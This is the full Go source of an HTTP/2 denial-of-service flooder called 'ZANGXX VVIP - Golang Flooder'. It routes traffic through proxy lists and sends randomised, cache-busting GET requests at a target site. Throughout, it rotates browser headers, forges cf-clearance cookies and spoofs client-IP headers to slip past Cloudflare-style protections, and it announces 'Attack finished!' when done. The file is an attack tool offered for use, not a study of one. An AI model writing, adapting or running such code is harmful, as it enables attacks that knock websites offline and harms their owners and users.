package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	proxies     []string
	targetURL   string
	timeLimit   int
	rate        int
	threads     int
	parsedTarget *url.URL
)

// ========== HEADER POOLS ==========
var acceptHeaders = []string{
	"*/*", "image/*", "image/webp,image/apng", "text/html",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
}

var encodingHeaders = []string{"*", "*/*", "gzip", "gzip, deflate, br", "gzip, deflate", "gzip, deflate, br, zstd"}

var cacheHeaders = []string{
	"max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0",
	"must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, private",
	"max-age=300, must-revalidate", "no-store, max-age=0, private, must-revalidate",
	"public, max-age=10, s-maxage=10", "no-cache, no-store,private, max-age=0, must-revalidate",
	"no-cache, no-store,private, s-maxage=604800, must-revalidate",
	"no-cache, no-store,private, max-age=604800, must-revalidate",
}

var referers = []string{
	"https://google.com", "https://check-host.net/", "https://www.facebook.com/",
	"https://www.youtube.com/", "https://www.fbi.com/", "https://discord.com",
	"https://www.cloudflare.com",
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
}

var languages = []string{
	"id-ID,id;q=0.9,en;q=0.8", "en-US,en;q=0.9,id;q=0.8",
	"en-GB,en;q=0.9", "ja-JP,ja;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
}

var secFetchModes = []string{"navigate", "same-origin", "no-cors", "cors"}
var secFetchSites = []string{"same-origin", "same-site", "cross-site", "none"}
var secFetchDests = []string{"document", "sharedworker", "subresource", "unknown", "worker"}

var ciphers = []string{
	"TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256",
	"TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256",
}

// ========== UTILITY FUNCTIONS ==========
func randomElement(slice []string) string {
	return slice[rand.Intn(len(slice))]
}

func randStr(length int) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func randStrNum(length int) string {
	const chars = "0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func genRandomString(minLen, maxLen int) string {
	length := rand.Intn(maxLen-minLen+1) + minLen
	return randStr(length)
}

func ipSpoof() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func readLines(filePath string) []string {
	file, err := os.Open(filePath)
	if err != nil {
		return nil
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines
}

// ========== CORE FLOODER ==========
func flooderWorker(wg *sync.WaitGroup, stopChan <-chan struct{}) {
	defer wg.Done()

	// Proxy loop
	for {
		select {
		case <-stopChan:
			return
		default:
			if len(proxies) == 0 {
				time.Sleep(1 * time.Second)
				continue
			}

			proxyAddr := proxies[rand.Intn(len(proxies))]
			proxyParts := strings.Split(proxyAddr, ":")
			if len(proxyParts) < 2 {
				continue
			}
			proxyHost := proxyParts[0]
			proxyPort, _ := strconv.Atoi(proxyParts[1])

			// CONNECT via proxy
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", proxyHost, proxyPort), 10*time.Second)
			if err != nil {
				continue
			}

			connectPayload := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", parsedTarget.Host, parsedTarget.Host)
			_, err = conn.Write([]byte(connectPayload))
			if err != nil {
				conn.Close()
				continue
			}

			// Read response
			buf := make([]byte, 1024)
			n, err := conn.Read(buf)
			if err != nil || !strings.Contains(string(buf[:n]), "200") {
				conn.Close()
				continue
			}

			// Upgrade to TLS
			tlsConfig := &tls.Config{
				ServerName:         parsedTarget.Host,
				InsecureSkipVerify: true,
				NextProtos:         []string{"h2"},
				CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384, tls.TLS_CHACHA20_POLY1305_SHA256},
			}

			tlsConn := tls.Client(conn, tlsConfig)
			err = tlsConn.Handshake()
			if err != nil {
				tlsConn.Close()
				continue
			}

			if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
				tlsConn.Close()
				continue
			}

			// HTTP/2 client
			tr := &http.Transport{
				DialTLS: func(network, addr string) (net.Conn, error) {
					return tlsConn, nil
				},
				ForceAttemptHTTP2: true,
				MaxIdleConns:      0,
				MaxConnsPerHost:   0,
				IdleConnTimeout:   time.Duration(rand.Intn(60)+60) * time.Second,
				DisableKeepAlives: false,
			}
			client := &http.Client{Transport: tr}

			// Send requests in loop
			go func() {
				ticker := time.NewTicker(time.Second)
				defer ticker.Stop()
				rateCount := 0

				for {
					select {
					case <-stopChan:
						tr.CloseIdleConnections()
						tlsConn.Close()
						return
					case <-ticker.C:
						rateCount = 0
					default:
						if rateCount >= rate {
							time.Sleep(10 * time.Millisecond)
							continue
						}

						// Build dynamic path
						path := parsedTarget.Path
						if path == "" {
							path = "/"
						}
						path += "?" + randStr(6) + "=" + genRandomString(20, 30) + "&" + randStr(4) + "=" + genRandomString(15, 25)

						req, _ := http.NewRequest("GET", parsedTarget.Scheme+"://"+parsedTarget.Host+path, nil)
						req.Header.Set(":authority", parsedTarget.Host)
						req.Header.Set(":scheme", "https")
						req.Header.Set(":method", "GET")
						req.Header.Set("accept", randomElement(acceptHeaders))
						req.Header.Set("accept-encoding", randomElement(encodingHeaders))
						req.Header.Set("accept-language", randomElement(languages))
						req.Header.Set("cache-control", randomElement(cacheHeaders))
						req.Header.Set("referer", randomElement(referers))
						req.Header.Set("user-agent", randomElement(userAgents))
						req.Header.Set("sec-fetch-mode", randomElement(secFetchModes))
						req.Header.Set("sec-fetch-site", randomElement(secFetchSites))
						req.Header.Set("sec-fetch-dest", randomElement(secFetchDests))
						req.Header.Set("x-forwarded-for", ipSpoof())
						req.Header.Set("x-real-ip", ipSpoof())
						req.Header.Set("x-client-ip", ipSpoof())
						req.Header.Set("cf-connecting-ip", ipSpoof())
						req.Header.Set("cookie", "cf-clearance="+genRandomString(16, 64))
						req.Header.Set("pragma", "no-cache")
						req.Header.Set("upgrade-insecure-requests", "1")

						go func() {
							resp, err := client.Do(req)
							if err == nil && resp != nil {
								resp.Body.Close()
							}
						}()

						rateCount++
					}
				}
			}()

			// Keep connection alive until stop
			<-stopChan
			tr.CloseIdleConnections()
			tlsConn.Close()
			return
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 7 {
		fmt.Println("Usage: url time rate thread proxy.txt")
		fmt.Println("Example: ./flooder https://example.com 60 10 4 proxies.txt")
		return
	}

	targetURL = os.Args[1]
	timeLimit, _ = strconv.Atoi(os.Args[2])
	rate, _ = strconv.Atoi(os.Args[3])
	threads, _ = strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]

	var err error
	parsedTarget, err = url.Parse(targetURL)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	proxies = readLines(proxyFile)
	if len(proxies) == 0 {
		fmt.Println("No proxies loaded!")
		return
	}

	fmt.Println("\033[36m--------------------------------------------\033[0m")
	fmt.Printf("\033[33mTarget: \033[37m%s\033[0m\n", targetURL)
	fmt.Printf("\033[33mRate: \033[37m%d/s\033[0m \033[36m|\033[0m \033[33mThreads: \033[37m%d\033[0m\n", rate, threads)
	fmt.Printf("\033[33mProxy: \033[37m%s (\033[32m%d\033[37m)\033[0m\n", proxyFile, len(proxies))
	fmt.Println("\033[36m--------------------------------------------\033[0m")
	fmt.Println("\033[35mZANGXX VVIP - Golang Flooder\033[0m")
	fmt.Println("\033[36m--------------------------------------------\033[0m")

	stopChan := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go flooderWorker(&wg, stopChan)
	}

	time.Sleep(time.Duration(timeLimit) * time.Second)
	close(stopChan)
	wg.Wait()

	fmt.Println("\033[31m[!] Attack finished!\033[0m")
}